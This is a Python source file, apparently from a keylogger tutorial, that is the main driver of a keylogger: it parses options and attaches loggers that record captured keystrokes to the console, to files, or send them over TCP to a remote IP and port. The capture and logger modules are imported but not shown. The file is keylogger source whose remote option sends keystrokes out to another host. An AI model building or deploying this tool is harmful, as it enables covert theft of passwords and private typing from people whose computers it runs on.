# https://www.thepythoncode.com/article/write-a-keylogger-python

import logger
from keylogger import Keylogger

import sys
import argparse


def parse_args():
    parser = argparse.ArgumentParser()
    
    local_loggers = parser.add_argument_group('local loggers')
    local_loggers.add_argument('-c', '--console', action='store_true',
                        help='Log keys to console (Default if no other logger is selected)')
    local_loggers.add_argument('-f', '--file', action='append',
                        metavar=('FILE'),
                        help='Log keys to a given file')
    
    remote_loggers = parser.add_argument_group('remote loggers')
    remote_loggers.add_argument('--tcp',action='append',
                        nargs=2, metavar=('IP', 'PORT'),
                        help='Send keys to a given server over TCP protocol')

    args = parser.parse_args()

    # Default to console logger if no other logger is selected
    if not args.console and args.file is None and args.tcp is None:
        args.console = True
    return args


if __name__ == '__main__':
    args = parse_args()

    keylogger = Keylogger()

    if args.console:
        keylogger.attach_logger(logger.ConsoleLogger())
    
    if args.file is not None:
        for file in args.file:
            keylogger.attach_logger(logger.FileLogger(file))
    
    if args.tcp is not None:
        for ip, port in args.tcp:
            keylogger.attach_logger(logger.TCPLogger(ip, int(port)))

    keylogger.wait()